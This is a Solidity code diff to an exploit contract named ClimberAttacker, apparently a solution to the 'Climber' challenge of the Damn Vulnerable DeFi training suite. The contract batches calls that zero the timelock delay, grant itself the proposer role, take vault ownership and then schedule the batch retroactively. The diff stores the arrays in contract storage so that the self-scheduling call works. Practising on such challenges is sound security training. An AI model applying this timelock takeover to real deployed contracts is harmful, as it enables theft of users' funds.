@@ -8,9 +8,14 @@ import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 
-contract ClimberAttacker {
+contract ClimberAttacker is Test{
     ClimberVault vault;
     ClimberTimelock timelock;
+
+    address[] private _targets;
+    uint256[] private _values;
+    bytes[] private _dataElements;
+    bytes32 private _salt;
 
     constructor(ClimberVault _vault, ClimberTimelock _timelock){
         vault = _vault;
@@ -19,36 +24,33 @@ contract ClimberAttacker {
    
    function attack() external{
 
-        address[] memory targets = new address[](4); 
-        uint256[] memory values = new uint256[](4);
-        bytes[] memory dataElements = new bytes[](4);
-        bytes32 salt = bytes32(0);
+         _targets = new address[](4);
+        _values = new uint256[](4);
+        _dataElements = new bytes[](4);
+        _salt = bytes32(0);
 
-        targets[0] = address(timelock);
-        values[0] = 0;
-        dataElements[0] = abi.encodeWithSelector(timelock.updateDelay.selector, 0);
+        _targets[0] = address(timelock);
+        _values[0] = 0;
+        _dataElements[0] = abi.encodeWithSelector(timelock.updateDelay.selector, 0);
 
-        targets[1] = address(timelock);
-        values[1] = 0;
-        dataElements[1] = abi.encodeWithSelector(timelock.grantRole.selector, PROPOSER_ROLE,address(this));
+        _targets[1] = address(timelock);
+        _values[1] = 0;
+        _dataElements[1] = abi.encodeWithSelector(timelock.grantRole.selector, PROPOSER_ROLE, address(this));
 
-        targets[2] = address(vault);
-        values[2] = 0;
-        dataElements[2] = abi.encodeWithSelector(vault.transferOwnership.selector, address(this));
+        _targets[2] = address(vault);
+        _values[2] = 0;
+        _dataElements[2] = abi.encodeWithSelector(vault.transferOwnership.selector, address(this));
 
-        targets[3] = address(this);
-        values[3] = 0;
-        dataElements[3] = abi.encodeWithSelector(this.scheduleOperation.selector, targets,values,dataElements,salt);
+        _targets[3] = address(this);
+        _values[3] = 0;
+        _dataElements[3] = abi.encodeWithSelector(this.scheduleOperation.selector);
 
-        timelock.execute(targets, values, dataElements, salt);
+        timelock.execute(_targets, _values, _dataElements, _salt);
+
         
    }    
 
     function scheduleOperation(
-        address[] memory _targets,
-        uint256[] memory _values,
-        bytes[] memory _dataElements,
-        bytes32 _salt
     ) external {
         timelock.schedule(_targets, _values, _dataElements, _salt);
     } 
